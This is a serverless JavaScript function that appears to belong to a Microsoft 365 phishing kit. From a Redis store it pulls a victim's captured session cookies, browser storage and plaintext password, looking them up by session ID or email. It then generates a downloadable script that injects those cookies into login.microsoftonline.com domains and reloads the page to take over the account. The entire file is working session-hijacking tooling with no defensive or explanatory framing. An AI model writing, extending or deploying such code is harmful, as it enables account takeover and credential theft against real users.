const handler = async (event, context) => {
  // CORS headers
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Methods': 'GET, OPTIONS',
  };

  // Handle preflight requests
  if (event.httpMethod === 'OPTIONS') {
    return {
      statusCode: 200,
      headers,
      body: '',
    };
  }

  if (event.httpMethod !== 'GET') {
    return {
      statusCode: 405,
      headers,
      body: JSON.stringify({ error: 'Method not allowed' }),
    };
  }

  try {
    // Check environment variables
    const UPSTASH_REDIS_REST_URL = process.env.UPSTASH_REDIS_REST_URL;
    const UPSTASH_REDIS_REST_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;

    if (!UPSTASH_REDIS_REST_URL || !UPSTASH_REDIS_REST_TOKEN) {
      console.error('Missing Redis configuration in getCookies');
      return {
        statusCode: 500,
        headers,
        body: JSON.stringify({ 
          error: 'Server configuration error - Redis credentials missing' 
        }),
      };
    }

    // Initialize Redis
    let redis;
    try {
      const { Redis } = await import('@upstash/redis');
      redis = new Redis({
        url: UPSTASH_REDIS_REST_URL,
        token: UPSTASH_REDIS_REST_TOKEN,
      });
    } catch (redisError) {
      console.error('Redis initialization error:', redisError);
      return {
        statusCode: 500,
        headers,
        body: JSON.stringify({ 
          error: 'Database connection error',
          details: redisError.message
        }),
      };
    }

    // Get client IP
    const getClientIP = () => {
      return event.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
             event.headers['x-real-ip'] || 
             event.headers['cf-connecting-ip'] ||
             event.requestContext?.identity?.sourceIp ||
             'Unknown';
    };

    // Get parameters - Fixed URL parsing
    const url = event.queryStringParameters || {};
    const sessionId = url.sessionId;
    const email = url.email;

    console.log('🔍 Getting cookies for:', { sessionId, email });

    if (!sessionId && !email) {
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({ error: 'SessionId or email parameter required' }),
      };
    }

    let cookiesData = null;

    // Try to get by session ID first
    if (sessionId) {
      try {
        const sessionData = await redis.get(`session:${sessionId}`);
        if (sessionData) {
          const session = JSON.parse(sessionData);
          cookiesData = {
            cookies: session.formattedCookies || session.cookies || [],
            localStorage: session.localStorage || 'Empty',
            sessionStorage: session.sessionStorage || 'Empty',
            timestamp: session.timestamp,
            email: session.email,
            password: session.password || 'Not captured'
          };
        }
      } catch (error) {
        console.error('Error getting session by ID:', error);
      }
    }

    // Fallback to email lookup
    if (!cookiesData && email) {
      try {
        const userData = await redis.get(`user:${email}`);
        if (userData) {
          const user = JSON.parse(userData);
          cookiesData = {
            cookies: user.formattedCookies || user.cookies || [],
            localStorage: user.localStorage || 'Empty',
            sessionStorage: user.sessionStorage || 'Empty',
            timestamp: user.timestamp,
            email: user.email,
            password: user.password || 'Not captured'
          };
        }
      } catch (error) {
        console.error('Error getting user by email:', error);
      }
    }

    // Try cookies-specific lookup
    if (!cookiesData && sessionId) {
      try {
        const cookieSpecificData = await redis.get(`cookies:${sessionId}`);
        if (cookieSpecificData) {
          cookiesData = JSON.parse(cookieSpecificData);
        }
      } catch (error) {
        console.error('Error getting cookies by session ID:', error);
      }
    }

    if (!cookiesData) {
      return {
        statusCode: 404,
        headers,
        body: JSON.stringify({ 
          error: 'No cookies found for the specified session',
          sessionId: sessionId,
          email: email
        }),
      };
    }

    console.log('✅ Found cookies data:', {
      cookieCount: Array.isArray(cookiesData.cookies) ? cookiesData.cookies.length : 0,
      email: cookiesData.email,
      hasFormattedCookies: Array.isArray(cookiesData.formattedCookies),
      formattedCookieCount: Array.isArray(cookiesData.formattedCookies) ? cookiesData.formattedCookies.length : 0
    });

    const clientIP = getClientIP();
    const userEmail = cookiesData.email || 'Not captured';
    const userPassword = cookiesData.password || 'Not captured';
    
    console.log('📊 Processing cookies data:', {
      email: userEmail,
      cookieCount: Array.isArray(cookiesData.cookies) ? cookiesData.cookies.length : 0,
      cookieType: typeof cookiesData.cookies,
      formattedCookieCount: Array.isArray(cookiesData.formattedCookies) ? cookiesData.formattedCookies.length : 0
    });

    // Process cookies with improved handling
    let processedCookies = [];
    
    // First try formattedCookies if available
    if (Array.isArray(cookiesData.formattedCookies) && cookiesData.formattedCookies.length > 0) {
      processedCookies = cookiesData.formattedCookies.filter(cookie => cookie && cookie.name);
      console.log('✅ Using formattedCookies:', processedCookies.length);
    }
    // Fallback to regular cookies
    else if (Array.isArray(cookiesData.cookies)) {
      processedCookies = cookiesData.cookies.filter(cookie => cookie && cookie.name);
      console.log('✅ Using regular cookies:', processedCookies.length);
    } else if (typeof cookiesData.cookies === 'string' && cookiesData.cookies !== 'No cookies found') {
      try {
        const parsedCookies = JSON.parse(cookiesData.cookies);
        if (Array.isArray(parsedCookies)) {
          processedCookies = parsedCookies.filter(cookie => cookie && cookie.name);
        }
      } catch (e) {
        // Try to parse as document.cookie format
        if (cookiesData.cookies.includes('=')) {
          const cookieStrings = cookiesData.cookies.split(';');
          processedCookies = cookieStrings.map(cookieStr => {
            const [name, ...valueParts] = cookieStr.trim().split('=');
            const value = valueParts.join('=');
            return name && value ? {
              name: name.trim(),
              value: value.trim(),
              domain: '.login.microsoftonline.com',
              path: '/',
              secure: true,
              httpOnly: false,
              sameSite: 'none',
              expirationDate: Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60),
              hostOnly: false,
              session: false,
              storeId: null
            } : null;
          }).filter(cookie => cookie !== null);
        }
      }
    }
    
    // Also check documentCookies if available
    if (processedCookies.length === 0 && cookiesData.documentCookies && typeof cookiesData.documentCookies === 'string') {
      const cookieStrings = cookiesData.documentCookies.split(';');
      processedCookies = cookieStrings.map(cookieStr => {
        const [name, ...valueParts] = cookieStr.trim().split('=');
        const value = valueParts.join('=');
        return name && value ? {
          name: name.trim(),
          value: value.trim(),
          domain: '.login.microsoftonline.com',
          path: '/',
          secure: true,
          httpOnly: false,
          sameSite: 'none',
          expirationDate: Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60),
          hostOnly: false,
          session: false,
          storeId: null
        } : null;
      }).filter(cookie => cookie !== null);
      console.log('✅ Using documentCookies:', processedCookies.length);
    }

    // Enhanced cookie restoration logic with all features from restoreCookies.js
    const enhancedRestoreFunction = `
// Enhanced Microsoft Cookie Restoration System
// Complete session restoration with advanced error handling and validation

// Browser compatibility detection
function detectBrowserCapabilities() {
    const userAgent = navigator.userAgent.toLowerCase();
    const capabilities = {
        browser: 'unknown',
        version: 'unknown',
        supportsSameSiteNone: true,
        supportsSecure: true,
        maxCookieSize: 4096,
        maxCookiesPerDomain: 50,
        supportsHttpOnly: false,
        supportsPartitioned: false
    };

    if (userAgent.includes('chrome')) {
        capabilities.browser = 'chrome';
        const match = userAgent.match(/chrome\\/(\d+)/);
        capabilities.version = match ? match[1] : 'unknown';
        capabilities.supportsSameSiteNone = parseInt(capabilities.version) >= 80;
        capabilities.supportsPartitioned = parseInt(capabilities.version) >= 118;
    } else if (userAgent.includes('firefox')) {
        capabilities.browser = 'firefox';
        const match = userAgent.match(/firefox\\/(\d+)/);
        capabilities.version = match ? match[1] : 'unknown';
        capabilities.supportsSameSiteNone = parseInt(capabilities.version) >= 69;
    } else if (userAgent.includes('safari') && !userAgent.includes('chrome')) {
        capabilities.browser = 'safari';
        const match = userAgent.match(/version\\/(\d+)/);
        capabilities.version = match ? match[1] : 'unknown';
        capabilities.supportsSameSiteNone = parseInt(capabilities.version) >= 13;
    } else if (userAgent.includes('edge')) {
        capabilities.browser = 'edge';
        const match = userAgent.match(/edge\\/(\d+)/);
        capabilities.version = match ? match[1] : 'unknown';
        capabilities.supportsSameSiteNone = parseInt(capabilities.version) >= 80;
    }

    return capabilities;
}

// Domain validation function
function validateDomain(cookieDomain, currentDomain = window.location.hostname) {
    if (!cookieDomain) return { valid: true, reason: 'No domain specified' };
    
    const cleanCookieDomain = cookieDomain.startsWith('.') ? cookieDomain.substring(1) : cookieDomain;
    
    if (currentDomain === cleanCookieDomain) {
        return { valid: true, reason: 'Exact domain match' };
    }
    
    if (currentDomain.endsWith('.' + cleanCookieDomain)) {
        return { valid: true, reason: 'Subdomain match' };
    }
    
    const microsoftDomains = [
        'login.microsoftonline.com',
        'account.microsoft.com',
        'outlook.com',
        'office.com',
        'microsoft.com'
    ];
    
    if (microsoftDomains.some(domain => 
        currentDomain.includes(domain) || cleanCookieDomain.includes(domain)
    )) {
        return { valid: true, reason: 'Microsoft domain compatibility' };
    }
    
    return { 
        valid: false, 
        reason: \`Domain mismatch: \${currentDomain} vs \${cleanCookieDomain}\` 
    };
}

// Cookie size validation
function validateCookieSize(name, value) {
    const cookieString = \`\${name}=\${value}\`;
    const size = new Blob([cookieString]).size;
    
    if (size > 4096) {
        return { 
            valid: false, 
            size, 
            reason: \`Cookie too large: \${size} bytes (max 4096)\` 
        };
    }
    
    return { valid: true, size, reason: 'Size OK' };
}

// Expiration validation
function validateExpiration(expires, expirationDate) {
    const now = Date.now();
    let expiryTime = null;
    
    if (expires) {
        expiryTime = expires > 1e10 ? expires : expires * 1000;
    } else if (expirationDate) {
        expiryTime = expirationDate > 1e10 ? expirationDate : expirationDate * 1000;
    }
    
    if (expiryTime && expiryTime <= now) {
        return { 
            valid: false, 
            expired: true, 
            reason: \`Cookie expired: \${new Date(expiryTime).toISOString()}\` 
        };
    }
    
    return { valid: true, expired: false, reason: 'Not expired' };
}

// Security warning system
function checkSecurityWarnings(cookie, capabilities) {
    const warnings = [];
    
    if (window.location.protocol === 'https:' && !cookie.secure) {
        warnings.push('Insecure cookie on HTTPS site - may be rejected');
    }
    
    if ((cookie.sameSite === 'None' || cookie.samesite === 'None') && !cookie.secure) {
        warnings.push('SameSite=None requires Secure flag');
    }
    
    if (!capabilities.supportsSameSiteNone && 
        (cookie.sameSite === 'None' || cookie.samesite === 'None')) {
        warnings.push(\`Browser \${capabilities.browser} v\${capabilities.version} may not support SameSite=None\`);
    }
    
    if (cookie.httpOnly) {
        warnings.push('HttpOnly cookies cannot be set via JavaScript');
    }
    
    return warnings;
}

// Duplicate cookie detection and handling
function handleDuplicates(cookiesArray) {
    const seen = new Map();
    const duplicates = [];
    const unique = [];
    
    cookiesArray.forEach((cookie, index) => {
        const key = \`\${cookie.name}:\${cookie.domain || ''}:\${cookie.path || '/'}\`;
        
        if (seen.has(key)) {
            duplicates.push({
                index,
                cookie,
                originalIndex: seen.get(key).index,
                reason: 'Duplicate name/domain/path combination'
            });
        } else {
            seen.set(key, { cookie, index });
            unique.push(cookie);
        }
    });
    
    return { unique, duplicates };
}

// Enhanced Microsoft cookie restoration with all improvements
function restoreMicrosoftCookies(cookiesArray, options = {}) {
    const config = {
        reload: true,
        validate: true,
        debug: true,
        skipExpired: true,
        skipInvalid: true,
        warnOnSecurity: true,
        handleDuplicates: true,
        ...options
    };
    
    console.log('🚀 Starting Enhanced Microsoft Cookie Restoration');
    console.log('📊 Configuration:', config);
    
    if (!Array.isArray(cookiesArray)) {
        const error = 'Invalid input: cookiesArray must be an array';
        console.error('❌', error);
        throw new Error(error);
    }
    
    if (cookiesArray.length === 0) {
        console.warn('⚠️ No cookies provided for restoration');
        return { success: false, restored: 0, errors: [], warnings: ['No cookies provided'] };
    }
    
    const capabilities = detectBrowserCapabilities();
    console.log('🌐 Browser capabilities:', capabilities);
    
    let processedCookies = cookiesArray;
    let duplicateInfo = { unique: cookiesArray, duplicates: [] };
    
    if (config.handleDuplicates) {
        duplicateInfo = handleDuplicates(cookiesArray);
        processedCookies = duplicateInfo.unique;
        
        if (duplicateInfo.duplicates.length > 0) {
            console.warn('🔄 Duplicate cookies detected:', duplicateInfo.duplicates.length);
            if (config.debug) {
                console.table(duplicateInfo.duplicates);
            }
        }
    }
    
    const results = [];
    const errors = [];
    const warnings = [];
    let successCount = 0;
    
    processedCookies.forEach((cookie, index) => {
        const cookieResult = {
            index,
            name: cookie.name || 'unnamed',
            value: cookie.value || '',
            domain: cookie.domain || '',
            path: cookie.path || '/',
            secure: !!cookie.secure,
            sameSite: cookie.sameSite || cookie.samesite || 'None',
            set: false,
            skipped: false,
            error: null,
            warnings: [],
            validations: {}
        };
        
        try {
            if (!cookie.name || typeof cookie.value === 'undefined') {
                throw new Error('Missing required name or value');
            }
            
            if (config.validate) {
                const domainCheck = validateDomain(cookie.domain);
                cookieResult.validations.domain = domainCheck;
                if (!domainCheck.valid && config.skipInvalid) {
                    cookieResult.skipped = true;
                    cookieResult.error = domainCheck.reason;
                    results.push(cookieResult);
                    return;
                }
                
                const sizeCheck = validateCookieSize(cookie.name, cookie.value);
                cookieResult.validations.size = sizeCheck;
                if (!sizeCheck.valid && config.skipInvalid) {
                    cookieResult.skipped = true;
                    cookieResult.error = sizeCheck.reason;
                    results.push(cookieResult);
                    return;
                }
                
                const expiryCheck = validateExpiration(cookie.expires, cookie.expirationDate);
                cookieResult.validations.expiration = expiryCheck;
                if (!expiryCheck.valid && config.skipExpired) {
                    cookieResult.skipped = true;
                    cookieResult.error = expiryCheck.reason;
                    results.push(cookieResult);
                    return;
                }
            }
            
            if (config.warnOnSecurity) {
                const securityWarnings = checkSecurityWarnings(cookie, capabilities);
                cookieResult.warnings = securityWarnings;
                warnings.push(...securityWarnings.map(w => \`\${cookie.name}: \${w}\`));
            }
            
            const name = cookie.name;
            const value = cookie.value;
            const domain = cookie.domain || '';
            const path = cookie.path || '/';
            const secure = !!cookie.secure;
            const sameSite = cookie.sameSite || cookie.samesite || 'None';
            const expiresUnix = cookie.expires || cookie.expirationDate;
            const isSession = !!cookie.session || expiresUnix === undefined || expiresUnix === null;
            
            let cookieString = \`\${name}=\${value}; path=\${path};\`;
            
            if (name.startsWith('__Host-')) {
                cookieString = \`\${name}=\${value}; path=/; Secure;\`;
                if (domain) {
                    warnings.push(\`\${name}: __Host- prefix requires no domain (removed)\`);
                }
            } else if (name.startsWith('__Secure-')) {
                cookieString += ' Secure;';
                if (domain) {
                    cookieString += \` domain=\${domain};\`;
                }
            } else {
                if (domain) {
                    cookieString += \` domain=\${domain};\`;
                }
                if (secure) {
                    cookieString += ' Secure;';
                }
            }
            
            if (!isSession && expiresUnix) {
                const expiresMs = expiresUnix > 1e10 ? expiresUnix : expiresUnix * 1000;
                const expiresDate = new Date(expiresMs);
                cookieString += \` expires=\${expiresDate.toUTCString()};\`;
                cookieResult.expires = expiresDate.toUTCString();
            } else {
                cookieResult.expires = 'Session';
            }
            
            if (sameSite && capabilities.supportsSameSiteNone) {
                const samesiteNorm = sameSite.charAt(0).toUpperCase() + sameSite.slice(1).toLowerCase();
                cookieString += \` SameSite=\${samesiteNorm};\`;
            }
            
            document.cookie = cookieString;
            
            const cookieSet = document.cookie.includes(\`\${name}=\`);
            cookieResult.set = cookieSet;
            cookieResult.cookieString = cookieString;
            
            if (cookieSet) {
                successCount++;
            } else {
                cookieResult.error = 'Cookie was not set (browser rejected)';
                errors.push(\`\${name}: Browser rejected cookie\`);
            }
            
        } catch (err) {
            cookieResult.error = err.message;
            errors.push(\`\${cookie.name || 'unnamed'}: \${err.message}\`);
            console.error(\`❌ Failed to set cookie "\${cookie.name}":\`, err);
        }
        
        results.push(cookieResult);
    });
    
    if (config.debug) {
        console.log('\\n📊 COOKIE RESTORATION RESULTS');
        console.log('='.repeat(50));
        console.table(results.map(r => ({
            Name: r.name,
            Set: r.set ? '✅' : (r.skipped ? '⏭️' : '❌'),
            Domain: r.domain,
            Path: r.path,
            Secure: r.secure ? '🔒' : '🔓',
            SameSite: r.sameSite,
            Expires: r.expires,
            Error: r.error || (r.warnings.length > 0 ? \`\${r.warnings.length} warnings\` : 'None')
        })));
        
        console.log(\`\\n✅ Successfully restored: \${successCount}/\${cookiesArray.length} cookies\`);
        console.log(\`⏭️ Skipped: \${results.filter(r => r.skipped).length} cookies\`);
        console.log(\`❌ Failed: \${results.filter(r => !r.set && !r.skipped).length} cookies\`);
        
        if (duplicateInfo.duplicates.length > 0) {
            console.log(\`🔄 Duplicates removed: \${duplicateInfo.duplicates.length}\`);
        }
        
        if (warnings.length > 0) {
            console.warn('\\n⚠️ SECURITY WARNINGS:');
            warnings.forEach(warning => console.warn(\`  • \${warning}\`));
        }
        
        if (errors.length > 0) {
            console.error('\\n❌ ERRORS:');
            errors.forEach(error => console.error(\`  • \${error}\`));
        }
        
        console.log('\\n🌐 Browser Info:', \`\${capabilities.browser} v\${capabilities.version}\`);
        console.log('🔧 Capabilities:', {
            'SameSite=None': capabilities.supportsSameSiteNone ? '✅' : '❌',
            'Partitioned': capabilities.supportsPartitioned ? '✅' : '❌',
            'Max Cookie Size': \`\${capabilities.maxCookieSize} bytes\`,
            'Max Cookies/Domain': capabilities.maxCookiesPerDomain
        });
    }
    
    const summary = {
        success: successCount > 0,
        total: cookiesArray.length,
        restored: successCount,
        skipped: results.filter(r => r.skipped).length,
        failed: results.filter(r => !r.set && !r.skipped).length,
        duplicatesRemoved: duplicateInfo.duplicates.length,
        warnings: warnings.length,
        errors: errors.length,
        results,
        capabilities
    };
    
    console.log(\`\\n🎯 FINAL SUMMARY: \${successCount}/\${cookiesArray.length} cookies restored successfully\`);
    
    if (config.reload && successCount > 0) {
        console.log('🔄 Reloading page to activate restored session...');
        setTimeout(() => {
            window.location.reload();
        }, 1000);
    }
    
    return summary;
}

// Execute the enhanced restoration
restoreMicrosoftCookies(${JSON.stringify(processedCookies, null, 2)});

// Additional utility functions
function quickConsoleRestore(base64CookieString) {
    try {
        const cookies = JSON.parse(atob(base64CookieString));
        let count = 0;
        
        cookies.forEach(cookie => {
            let cookieStr = \`\${cookie.name}=\${cookie.value}\`;
            
            if (!cookie.name.startsWith('__Host-') && cookie.domain) {
                cookieStr += \`; domain=\${cookie.domain}\`;
            }
            
            if (cookie.path) {
                cookieStr += \`; path=\${cookie.path}\`;
            }
            
            if (cookie.expires) {
                cookieStr += \`; expires=\${new Date(cookie.expires * 1000).toUTCString()}\`;
            }
            
            if (cookie.secure || cookie.name.startsWith('__Host-') || cookie.name.startsWith('__Secure-')) {
                cookieStr += '; Secure';
            }
            
            if (cookie.samesite) {
                cookieStr += \`; SameSite=\${cookie.samesite}\`;
            }
            
            document.cookie = cookieStr;
            if (document.cookie.includes(\`\${cookie.name}=\`)) count++;
        });
        
        console.log(\`✅ Quick restore: \${count}/\${cookies.length} cookies set\`);
        return count;
        
    } catch (err) {
        console.error('❌ Quick restore failed:', err);
        return 0;
    }
}

// Make functions globally available
window.restoreMicrosoftCookies = restoreMicrosoftCookies;
window.quickConsoleRestore = quickConsoleRestore;
window.detectBrowserCapabilities = detectBrowserCapabilities;
`;

    // Create the output with enhanced restoration system
    const output = `// Microsoft 365 Cookie restoration for ${userEmail}
// Generated: ${new Date().toISOString()}
// Cookies found: ${processedCookies.length}
// Session ID: ${sessionId}
// Email: ${userEmail}

let ipaddress = "${clientIP}";
let email = "${userEmail}";
let password = "${userPassword}";
let sessionId = "${sessionId}";

console.log("Session Info:", {email, password, cookieCount: ${processedCookies.length}});

${enhancedRestoreFunction}

// Cookie Data:
${JSON.stringify(processedCookies, null, 2)}

// Local Storage:
// ${cookiesData.localStorage || 'Empty'}

// Session Storage:
// ${cookiesData.sessionStorage || 'Empty'}

// Enhanced Usage Examples:
// restoreMicrosoftCookies(cookiesArray, { reload: true, validate: true, debug: true });
// quickConsoleRestore(base64CookieString);
// detectBrowserCapabilities();`;

    return {
      statusCode: 200,
      headers: {
        ...headers,
        'Content-Type': 'text/javascript',
        'Content-Disposition': `attachment; filename="microsoft365_cookies_${userEmail.replace('@', '_at_')}_${Date.now()}.js"`,
      },
      body: output,
    };

  } catch (error) {
    console.error('❌ Error in getCookies function:', error);
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({ 
        error: 'Internal server error',
        details: error.message,
        timestamp: new Date().toISOString()
      }),
    };
  }
};

export { handler };